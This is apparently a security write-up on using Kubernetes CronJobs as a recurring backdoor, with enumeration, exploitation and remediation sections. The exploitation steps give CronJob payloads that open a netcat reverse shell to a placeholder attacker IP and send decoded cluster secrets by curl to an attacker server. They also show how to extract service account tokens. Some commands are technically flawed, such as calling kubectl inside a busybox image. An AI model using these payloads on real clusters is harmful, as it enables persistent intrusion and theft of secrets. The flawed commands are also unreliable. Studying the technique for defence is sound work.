# Kubernetes CronJob-Based Recurring Access Vulnerability

## 1. Overview

### Attack Vector Description

This vulnerability arises when a CronJob is configured in Kubernetes with insecure settings, allowing an attacker to gain recurring access to the cluster. The attacker leverages the CronJob's scheduled execution to repeatedly create malicious pods, containers, or execute commands within existing pods, effectively establishing a persistent backdoor. This backdoor is automatically recreated based on the CronJob's schedule, making it difficult to eradicate completely without proper remediation. The attack vector involves exploiting misconfigurations in the CronJob's specification, specifically regarding permissions, volume mounts, and the container image used.

### Potential Impact and Consequences

Successful exploitation of this vulnerability can lead to severe consequences, including:

*   **Data Exfiltration:** The attacker can repeatedly extract sensitive data from the cluster's pods and volumes.
*   **Resource Exhaustion:** The malicious CronJob can be used to launch resource-intensive processes, leading to denial of service for legitimate applications.
*   **Lateral Movement:** Recurring access facilitates lateral movement within the cluster, allowing the attacker to compromise other namespaces and applications.
*   **Persistent Backdoor:** The CronJob serves as a persistent backdoor, allowing the attacker to regain access even after initial compromise is detected and remediated.
*   **Supply Chain Attacks:** If the CronJob interacts with external systems or is part of a deployment pipeline, it could be used to compromise downstream systems.

### Risk Level Assessment

**Critical**

This vulnerability is considered critical due to the potential for persistent access, data exfiltration, resource exhaustion, and lateral movement within the Kubernetes cluster. The recurring nature of the attack makes it significantly more dangerous than a one-time compromise.

### Technical Explanation

The vulnerability exists due to a combination of factors:

*   **Insecure CronJob Definition:** The CronJob's specification might include overly permissive Service Account bindings or elevated privileges (e.g., privileged containers).
*   **Vulnerable Container Image:** The container image used by the CronJob might contain known vulnerabilities that can be exploited.
*   **Insecure Volume Mounts:** The CronJob might mount volumes with sensitive data or credentials, allowing the attacker to access them repeatedly.
*   **Missing Security Policies:** Absence of Pod Security Policies (PSP) or Pod Security Admission (PSA) allows the CronJob to create pods with elevated privileges.
*   **Lack of Auditing and Monitoring:** Inadequate auditing and monitoring make it difficult to detect and respond to malicious CronJob activity.

### Prerequisites and Conditions Needed

*   **Kubernetes Cluster Access:** The attacker needs some initial access to the Kubernetes cluster, potentially through a compromised user account or a vulnerable application. Read access to view CronJob definitions is usually sufficient for the validation phase. Write access (to create or modify CronJobs) is needed for exploitation.
*   **Knowledge of Kubernetes Concepts:** Familiarity with Kubernetes concepts such as CronJobs, Pods, Service Accounts, Volumes, and Namespaces is required.
*   **Network Connectivity:** Network connectivity between the attacker's machine and the Kubernetes API server.
*   **kubectl configured:** `kubectl` properly configured to interact with the target cluster.

## 2. Validation and Exploitation Steps

### Validation Phase

**Step 1: Enumerate CronJobs**

```bash
kubectl get cronjobs --all-namespaces
```

*   **Explanation:** This command lists all CronJobs across all namespaces in the Kubernetes cluster.
*   **Why:** This is the first step to identify potential target CronJobs.
*   **Expected Output:** A table listing CronJobs, their namespace, schedule, age, and last schedule time.
*   **What to look for:** CronJobs with potentially interesting names, schedules, or namespaces (e.g., `monitoring`, `backup`, `secret-updater`).
*   **Contribution:** Identifies potential targets for further investigation.
*   **Alternative:** `kubectl get cj -A`

**Step 2: Describe a Potentially Vulnerable CronJob**

```bash
kubectl describe cronjob <cronjob-name> -n <namespace>
```

*   **Explanation:** This command retrieves detailed information about a specific CronJob. Replace `<cronjob-name>` and `<namespace>` with the actual values.
*   **Why:** This allows us to inspect the CronJob's configuration, including the container image, command, volume mounts, and Service Account.
*   **Expected Output:** A detailed description of the CronJob, including its schedule, active jobs, last schedule time, and the pod template specification.
*   **What to look for:**
    *   **Container Image:** Is the image publicly available? Does it have known vulnerabilities?
    *   **Command:** What command is executed? Does it have the potential to be abused (e.g., running a shell script)?
    *   **Volume Mounts:** Are sensitive volumes mounted (e.g., `/var/run/secrets/kubernetes.io/serviceaccount`)?
    *   **Service Account:** Which Service Account is used? Does it have excessive permissions?
    *   **Privileged Containers:** Is `securityContext.privileged` set to `true`?
*   **Contribution:** Provides insights into the CronJob's configuration and potential vulnerabilities.
*   **Alternative:** `kubectl get cronjob <cronjob-name> -n <namespace> -o yaml`

**Step 3: Check the Service Account Permissions**

```bash
kubectl describe serviceaccount <serviceaccount-name> -n <namespace>
```

*   **Explanation:** This command retrieves information about the Service Account used by the CronJob. Replace `<serviceaccount-name>` and `<namespace>` with the actual values.
*   **Why:** This allows us to determine the permissions associated with the Service Account.
*   **Expected Output:** A description of the Service Account, including its tokens and any associated secrets. It does *not* show the actual RBAC permissions.
*   **What to look for:** The `Secrets` field will list the secrets associated with the service account. Note the secret name to check RBAC permissions in the next step.
*   **Contribution:** Helps determine if the CronJob has excessive permissions via its Service Account.

**Step 4: Determine the RBAC Permissions of the Service Account**

This requires more complex commands. Find the secret associated with the service account first (see Step 3 output).  Then use that secret's name to find the service account token.  Finally, use `kubectl auth can-i` to determine what actions the service account can perform.

```bash
# Replace <secret-name> with the secret name found in the previous step. Replace <namespace> if needed
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data.token}' | base64 --decode
```

*   **Explanation:** This command retrieves the JWT token associated with the service account.
*   **Why:** The token is used to authenticate as the service account when querying RBAC permissions.
*   **Expected Output:**  A JWT token.
*   **What to look for:** This token is used for testing. It doesn't reveal permissions directly, but is necessary for the next command.
*   **Contribution:** Obtains the service account's token.

```bash
# Using the retrieved token (the output of the previous command), simulate actions
TOKEN="<jwt-token>"  # Replace <jwt-token> with the actual token
kubectl auth can-i create pods --as system:serviceaccount:<namespace>:<serviceaccount-name> --as-group system:authenticated --token=${TOKEN}
kubectl auth can-i get secrets --as system:serviceaccount:<namespace>:<serviceaccount-name> --as-group system:authenticated --token=${TOKEN}
```

*   **Explanation:** These commands check if the service account can create pods and get secrets. Replace `<namespace>` and `<serviceaccount-name>` with the correct values.
*   **Why:** To determine what the service account is authorized to do.
*   **Expected Output:** `yes` or `no` for each command, indicating whether the service account has the specified permission.
*   **What to look for:** Permissions that allow creating pods or accessing sensitive resources like secrets. A 'yes' response indicates potential privilege escalation.
*   **Contribution:** Determines what actions are allowed for the service account, crucial for assessing impact and planning exploitation.

### Exploitation Phase

**Step 5: Modify the CronJob to Execute a Malicious Command**

This step requires write access to the CronJob object.

```bash
kubectl edit cronjob <cronjob-name> -n <namespace>
```

*   **Explanation:** This command opens the CronJob's YAML definition in a text editor.
*   **Why:** This allows us to modify the CronJob's configuration and insert a malicious command.
*   **Expected Output:** The CronJob's YAML definition opens in a text editor.
*   **What to do:** Modify the `command` or `args` section of the container specification to execute a malicious command.  Examples:
    *   **Simple Example (reverse shell):**
        ```yaml
        spec:
          jobTemplate:
            spec:
              template:
                spec:
                  containers:
                  - name: my-container
                    image: busybox
                    command: ["/bin/sh", "-c", "nc -e /bin/sh <attacker-ip> <attacker-port>"]
                  restartPolicy: OnFailure
        ```
    *   **More sophisticated (write secret data to a file):**
        ```yaml
        spec:
          jobTemplate:
            spec:
              template:
                spec:
                  containers:
                  - name: my-container
                    image: busybox
                    command: ["/bin/sh", "-c"]
                    args: ["sleep 60; echo $(kubectl get secret my-secret -n default -o jsonpath='{.data.my-secret-key}' | base64 --decode) > /tmp/secret_data.txt"] # Replace with your secret, namespace, and key
                  volumeMounts:
                    - name: temp-volume
                      mountPath: /tmp
                  volumes:
                    - name: temp-volume
                      emptyDir: {}
                  restartPolicy: OnFailure
        ```
    *   **Exfiltrate data (requires network access):**

        ```yaml
        spec:
          jobTemplate:
            spec:
              template:
                spec:
                  containers:
                  - name: my-container
                    image: busybox
                    command: ["/bin/sh", "-c"]
                    args: ["sleep 60; kubectl get secret my-secret -n default -o json | curl -X POST -d @- <attacker-server>"]  # Replace attacker-server with your exfiltration endpoint
                  restartPolicy: OnFailure
        ```
*   **Contribution:** Modifies the CronJob to execute the attacker's desired command, creating a recurring backdoor.

**Step 6: (Optional) Trigger the CronJob Manually**

```bash
kubectl create job --from=cronjob/<cronjob-name> <job-name> -n <namespace>
```

*   **Explanation:** This command creates a one-time job from the CronJob's template, triggering the malicious command immediately. Replace `<cronjob-name>`, `<job-name>`, and `<namespace>` with the actual values.
*   **Why:** To test the exploit and verify that the malicious command executes as expected. It also helps to avoid waiting for the CronJob's next scheduled execution.
*   **Expected Output:** Confirmation that the job has been created.
*   **What to look for:**  Check if the reverse shell connects, the secret data is written to the file, or the data is exfiltrated.  You'll likely need to inspect logs of the newly created pod.
*   **Contribution:** Verifies the exploit and allows for immediate feedback.

**Step 7: Monitor for Recurring Access**

*   **Explanation:** Wait for the CronJob to execute its scheduled task and monitor for signs of compromise, such as a reverse shell connection, data exfiltration, or unauthorized access.
*   **Why:** To confirm that the CronJob is successfully creating the recurring backdoor.
*   **Expected Output:** Recurring signs of compromise based on the malicious command injected.

### Remediation Recommendations

*   **Least Privilege Principle:** Ensure that CronJobs and their associated Service Accounts have the minimum necessary permissions to perform their intended tasks. Avoid granting excessive privileges.
*   **Pod Security Admission (PSA)/Pod Security Policies (PSP):** Implement PSPs or PSA to restrict the capabilities of pods created by CronJobs. Prevent the use of privileged containers, host network access, and host path volume mounts unless absolutely necessary.
*   **Image Scanning:** Regularly scan container images used by CronJobs for known vulnerabilities. Use trusted base images and keep them updated with security patches.
*   **Audit Logging:** Enable audit logging in Kubernetes and monitor for suspicious activity related to CronJobs, such as unexpected pod creation or privilege escalation attempts.
*   **Network Policies:** Implement network policies to restrict network traffic between pods and namespaces. This can help to limit the impact of a compromised CronJob.
*   **Regular Review:** Regularly review CronJob definitions to ensure that they are configured securely and that the associated Service Accounts have appropriate permissions.
*   **Principle of Immutable Infrastructure:** When possible avoid writing directly in the pod from a script. Deploy pre-built images containing the necessary code. This eliminates the need for many of the commands listed above and improves security posture.
